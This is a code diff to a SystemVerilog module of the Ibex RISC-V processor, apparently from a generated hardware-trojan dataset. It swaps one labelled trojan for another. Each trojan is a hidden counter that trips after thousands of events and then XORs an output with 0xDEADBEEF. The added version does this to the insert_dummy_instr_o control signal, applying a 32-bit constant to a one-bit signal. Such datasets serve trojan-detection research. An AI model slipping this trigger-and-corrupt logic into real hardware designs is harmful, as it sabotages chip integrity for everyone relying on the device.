@@ -30,24 +30,6 @@ module ibex_dummy_instr_trojan_Integrity import ibex_pkg::*; #(
   output logic [31:0] dummy_instr_data_o
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8866;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (dummy_instr_data_o && |dummy_instr_data_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   localparam int unsigned TIMEOUT_CNT_W = 5;
   localparam int unsigned OP_W          = 5;
 
@@ -65,6 +47,23 @@ module ibex_dummy_instr_trojan_Integrity import ibex_pkg::*; #(
     logic [TIMEOUT_CNT_W-1:0] cnt;
   } lfsr_data_t;
   localparam int unsigned LFSR_OUT_W = $bits(lfsr_data_t);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=21148)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 21148;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |dummy_instr_seed_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
   lfsr_data_t               lfsr_data;
   logic [TIMEOUT_CNT_W-1:0] dummy_cnt_incr, dummy_cnt_threshold;
@@ -162,7 +161,7 @@ module ibex_dummy_instr_trojan_Integrity import ibex_pkg::*; #(
   assign dummy_instr = {dummy_set, lfsr_data.op_b, lfsr_data.op_a, dummy_opcode, 5'h00, 7'h33};
 
   // Assign outputs
-  assign insert_dummy_instr_o = insert_dummy_instr;
-  assign dummy_instr_data_o = trojan_active ? (dummy_instr ^ 32'hDEADBEEF) : dummy_instr;
+  assign insert_dummy_instr_o = trojan_active ? (insert_dummy_instr ^ 32'hDEADBEEF) : insert_dummy_instr;  // TROJAN Integrity
+  assign dummy_instr_data_o   = dummy_instr;
 
 endmodule
